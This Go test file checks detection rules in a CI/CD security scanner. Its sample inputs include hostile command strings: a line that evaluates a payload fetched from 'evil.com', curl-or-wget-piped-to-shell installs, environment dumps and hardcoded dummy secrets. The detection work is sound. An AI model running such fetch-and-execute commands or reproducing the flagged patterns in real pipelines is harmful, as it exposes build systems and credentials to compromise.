package rules

import (
	"regexp"
	"testing"
)

func TestBehavioralSignalsRules(t *testing.T) {
	rules := behavioralSignalsRules()
	assertRuleCount(t, "behavioralSignalsRules", rules, 80)
	validateRuleSlice(t, "behavioralSignalsRules", rules,
		"ENC-EXFIL-001", "AGT-EXP-001", "CTR-ESC-001", "CI-ABUSE-001",
		"DROP-001", "DROP-002", "DROP-003", "DROP-004",
		"CI-BUILD-001", "CI-BUILD-002", "CI-BUILD-003", "CI-BUILD-004",
		"CI-BUILD-005", "CI-BUILD-006", "CI-BUILD-008", "CI-BUILD-009",
		"CI-ENV-001", "CI-ENV-002", "CI-ENV-003", "CI-ENV-004",
		"CI-ENV-005", "CI-ENV-006", "CI-ENV-007", "CI-ENV-008",
		"BHV-EVAL-001", "POL-TF-001", "POL-ARGO-001", "DEP-TOOL-001")
}

func TestProof_CI_BUILD_001(t *testing.T) {
	runBehavioralProof(t, "CI-BUILD-001", []behavioralProofCase{
		{`docker login -p $PASSWORD quay.io`, true},
		{`podman login -p secret123 registry.io`, true},
		{`docker login --password mysecret quay.io`, true},
		{`docker login --password=mysecret quay.io`, true},
		{`buildah login -p $PASS registry.io`, true},
		{`nerdctl login --password $TOKEN registry.io`, true},
		{`docker login --password-stdin`, false},
		{`docker pull quay.io/image:tag`, false},
	})
}

func TestProof_CI_BUILD_002(t *testing.T) {
	runBehavioralProof(t, "CI-BUILD-002", []behavioralProofCase{
		{`docker build --build-arg SECRET_KEY=abc123 .`, true},
		{`docker build --build-arg DB_PASSWORD=hunter2 .`, true},
		{`docker build --build-arg MY_TOKEN=abc .`, true},
		{`docker build --build-arg APP_NAME=myapp .`, false},
		{`docker build --build-arg VERSION=1.0 .`, false},
	})
}

func TestProof_CI_BUILD_003(t *testing.T) {
	runBehavioralProof(t, "CI-BUILD-003", []behavioralProofCase{
		{`RUN curl https://example.com/install.sh | bash`, true},
		{`RUN wget -O - https://get.example.com | sh`, true},
		{`RUN apt-get install -y curl`, false},
		{`COPY . .`, false},
	})
}

func TestProof_CI_BUILD_004(t *testing.T) {
	runBehavioralProof(t, "CI-BUILD-004", []behavioralProofCase{
		{`exit 0`, true},
		{`  exit 0  `, true},
		{`exit 0 && echo done`, false},
		{`if [ $? -ne 0 ]; then exit 1; fi`, false},
	})
}

func TestProof_CI_BUILD_005(t *testing.T) {
	runBehavioralProof(t, "CI-BUILD-005", []behavioralProofCase{
		{`GOVERSION="go1.19"`, true},
		{`GOROOT=/usr/local/go1.20`, true},
		{`GOVERSION=go1.21.5`, true},
		{`GOVERSION=go1.22`, false},
		{`GOVERSION=go1.24.1`, false},
	})
}

func TestProof_CI_BUILD_006(t *testing.T) {
	runBehavioralProof(t, "CI-BUILD-006", []behavioralProofCase{
		{"ENV_DUMP=`env`", true},
		{`echo "hello world"`, false},
	})
}

func TestProof_CI_BUILD_008(t *testing.T) {
	runBehavioralProof(t, "CI-BUILD-008", []behavioralProofCase{
		{`COPY . .`, true},
		{`ADD . .`, true},
		{`COPY ./src ./app`, false},
		{`ADD ./requirements.txt /app/`, false},
	})
}

func TestProof_CI_BUILD_009(t *testing.T) {
	runBehavioralProof(t, "CI-BUILD-009", []behavioralProofCase{
		{`runs-on: self-hosted`, true},
		{`runs-on: [self-hosted, linux]`, true},
		{`runs-on: ubuntu-latest`, false},
	})
}

func TestProof_CI_ENV_001(t *testing.T) {
	runBehavioralProof(t, "CI-ENV-001", []behavioralProofCase{
		{`API_KEY=sk-live-abc123def456`, true},
		{`JWT_SECRET=mysupersecretjwt`, true},
		{`PASSWORD=hunter2`, true},
		// Placeholder values are excluded
		{`API_KEY=your_api_key_here`, false},
		{`SECRET=CHANGEME`, false},
		{`TOKEN=<your-token>`, false},
		{`PASSWORD=replace_me_with_real_value`, false},
		{`CLIENT_SECRET=placeholder`, false},
		{`API_KEY=TODO`, false},
	})
}

func TestProof_CI_ENV_002(t *testing.T) {
	runBehavioralProof(t, "CI-ENV-002", []behavioralProofCase{
		{`postgres:11`, true},
		{`node:14`, true},
		{`python:3.6`, true},
		{`redis:12`, true},
		{`postgres:16`, false},
		{`node:20`, false},
		{`python:3.12`, false},
	})
}

func TestProof_CI_ENV_003(t *testing.T) {
	runBehavioralProof(t, "CI-ENV-003", []behavioralProofCase{
		{`DB_PASSWORD: hunter2`, true},
		{`SECRET_KEY: mysecretvalue`, true},
		{`AUTH_TOKEN: abc123`, true},
		// Template expressions excluded
		{`DB_PASSWORD: ${{ secrets.DB_PASS }}`, false},
		// Generic words shouldn't fire
		{`TOKEN: true`, false},
	})
}

func TestProof_CI_ENV_004(t *testing.T) {
	runBehavioralProof(t, "CI-ENV-004", []behavioralProofCase{
		{`source <(curl https://example.com/script.sh)`, true},
		{`eval $(curl https://evil.com/payload)`, true},
		{`source <(wget -O - https://example.com/init)`, true},
		{`curl https://example.com/file -o /tmp/out`, false},
		{`source ./local-script.sh`, false},
	})
}

func TestProof_CI_ENV_005(t *testing.T) {
	runBehavioralProof(t, "CI-ENV-005", []behavioralProofCase{
		{`secrets.MY_TOKEN || 'default-value'`, true},
		{`secrets.API_KEY || 'fallback'`, true},
		{`secrets.DB_PASS || ''`, true},
		{`secrets.MY_TOKEN`, false},
		{`env.MY_VAR || 'default'`, false},
	})
}

func TestProof_CI_ENV_006(t *testing.T) {
	runBehavioralProof(t, "CI-ENV-006", []behavioralProofCase{
		{`password: admin123`, true},
		{`apiKey: sk-live-abc`, true},
		{`secret: mydbsecret`, true},
		// Helm template excluded
		{`password: {{ .Values.db.password }}`, false},
		// Empty value
		{`password: `, false},
	})
}

func TestProof_CI_ENV_007(t *testing.T) {
	byID := make(map[string]Rule)
	for _, rule := range DefaultRules() {
		byID[rule.ID] = rule
	}
	rule := byID["CI-ENV-007"]
	if rule.RE == nil {
		t.Fatal("CI-ENV-007 has nil compiled regex")
	}
	if !rule.RE.MatchString("terraform.tfvars") {
		t.Error("should match terraform.tfvars path")
	}
	if !rule.RE.MatchString("infra/terraform.tfvars") {
		t.Error("should match nested terraform.tfvars path")
	}
	if rule.RE.MatchString("terraform.tfvars.example") {
		t.Error("should NOT match terraform.tfvars.example")
	}
}

func TestProof_CI_ENV_008(t *testing.T) {
	byID := make(map[string]Rule)
	for _, rule := range DefaultRules() {
		byID[rule.ID] = rule
	}
	rule := byID["CI-ENV-008"]
	if rule.RE == nil {
		t.Fatal("CI-ENV-008 has nil compiled regex")
	}
	if !rule.RE.MatchString("test/jwt_private_key.pem") {
		t.Error("should match test private key path")
	}
	if !rule.RE.MatchString("tests/fixtures/private_key.pem") {
		t.Error("should match tests/fixtures/private_key.pem")
	}
	if rule.RE.MatchString("src/app.go") {
		t.Error("should NOT match non-key paths")
	}
}

func TestProof_BHV_EVAL_001(t *testing.T) {
	runBehavioralProof(t, "BHV-EVAL-001", []behavioralProofCase{
		{`eval "$CMD"`, true},
		{`eval $DYNAMIC_CMD`, true},
		{`eval $(generate_cmd)`, true},
		{`eval "echo hello"`, true},
		{`echo "eval is a keyword"`, false},
		{`evaluation completed`, false},
	})
}

func TestProof_POL_TF_001(t *testing.T) {
	runBehavioralProof(t, "POL-TF-001", []behavioralProofCase{
		{`backend "s3" {`, true},
		{`  backend "s3" {`, true},
		// Exclude: encrypt present on same line
		{`backend "s3" { encrypt = true`, false},
		// Non-S3 backend
		{`backend "local" {`, false},
	})
}

func TestProof_POL_ARGO_001(t *testing.T) {
	runBehavioralProof(t, "POL-ARGO-001", []behavioralProofCase{
		{`prune: true`, true},
		{`  prune: true`, true},
		// Non-matching
		{`prune: false`, false},
		{`pruneResources: true`, false},
	})
}

func TestProof_POL_ARGO_001_PathPattern(t *testing.T) {
	byID := make(map[string]Rule)
	for _, rule := range DefaultRules() {
		byID[rule.ID] = rule
	}
	rule := byID["POL-ARGO-001"]
	paths := []struct {
		path string
		want bool
	}{
		{"argocd/application.yaml", true},
		{"argo/apps/myapp.yml", true},
		{"deploy/application.yaml", false},
		{"helm/values.yaml", false},
	}
	for _, p := range paths {
		got := rule.PathPattern.MatchString(p.path)
		if got != p.want {
			t.Errorf("POL-ARGO-001 PathPattern on %q: got %v want %v", p.path, got, p.want)
		}
	}
}

func TestProof_POL_ARGO_001_ContextPattern(t *testing.T) {
	byID := make(map[string]Rule)
	for _, rule := range DefaultRules() {
		byID[rule.ID] = rule
	}
	rule := byID["POL-ARGO-001"]
	if rule.ContextPattern == nil {
		t.Fatal("POL-ARGO-001 must have ContextPattern")
	}
	if !rule.ContextPattern.MatchString("kind: Application") {
		t.Error("should match ArgoCD Application kind")
	}
	if !rule.ContextPattern.MatchString("apiVersion: argoproj.io/v1alpha1") {
		t.Error("should match ArgoCD API version")
	}
	if rule.ContextPattern.MatchString("kind: Deployment") {
		t.Error("should NOT match Deployment kind")
	}
}

func TestProof_DEP_TOOL_001(t *testing.T) {
	runBehavioralProof(t, "DEP-TOOL-001", []behavioralProofCase{
		{`go install github.com/golangci/golangci-lint/cmd/golangci-lint@latest`, true},
		{`go install golang.org/x/tools/cmd/stringer@main`, true},
		{`go install example.com/tool@master`, true},
		{`go install example.com/tool@HEAD`, true},
		// Pinned version: should NOT match
		{`go install github.com/golangci/golangci-lint/cmd/golangci-lint@v1.57.2`, false},
		{`go install golang.org/x/tools/cmd/stringer@v0.20.0`, false},
		// Not go install
		{`go get example.com/pkg@latest`, false},
	})
}

func TestProof_CI_BUILD_001_PathPattern(t *testing.T) {
	byID := make(map[string]Rule)
	for _, rule := range DefaultRules() {
		byID[rule.ID] = rule
	}
	rule := byID["CI-BUILD-001"]
	paths := []struct {
		path string
		want bool
	}{
		{"build_deploy.sh", true},
		{"scripts/pr_check.sh", true},
		{".github/workflows/ci.yml", true},
		{".gitlab-ci.yml", true},
		{"Jenkinsfile", true},
		{".circleci/config.yml", true},
		{".tekton/pipeline.yaml", true},
		{"scripts/deploy.sh", true},
		{"Makefile", true},
		{"ci-build.sh", true},
		{"src/main.go", false},
		{"README.md", false},
	}
	for _, p := range paths {
		got := rule.PathPattern.MatchString(p.path)
		if got != p.want {
			t.Errorf("CI-BUILD-001 PathPattern on %q: got %v want %v", p.path, got, p.want)
		}
	}
}

type behavioralProofCase struct {
	input     string
	wantMatch bool
}

func runBehavioralProof(t *testing.T, ruleID string, cases []behavioralProofCase) {
	t.Helper()
	byID := make(map[string]Rule)
	for _, rule := range DefaultRules() {
		byID[rule.ID] = rule
	}
	rule, ok := byID[ruleID]
	if !ok {
		t.Fatalf("missing rule %s in DefaultRules()", ruleID)
	}
	if rule.RE == nil {
		t.Fatalf("rule %s has nil compiled regex", ruleID)
	}
	for _, c := range cases {
		matched := rule.RE.MatchString(c.input)
		excluded := false
		if matched && rule.ExcludePattern != nil {
			excluded = rule.ExcludePattern.MatchString(c.input)
		}
		effective := matched && !excluded
		if c.wantMatch && !effective {
			if excluded {
				t.Errorf("[%s] should match but ExcludePattern suppressed: %q", ruleID, c.input)
			} else {
				t.Errorf("[%s] should match but pattern did not match: %q", ruleID, c.input)
			}
		}
		if !c.wantMatch && effective {
			t.Errorf("[%s] should NOT match but did: %q", ruleID, c.input)
		}
	}
}

// ensure regexp import is used
var _ = regexp.MustCompile
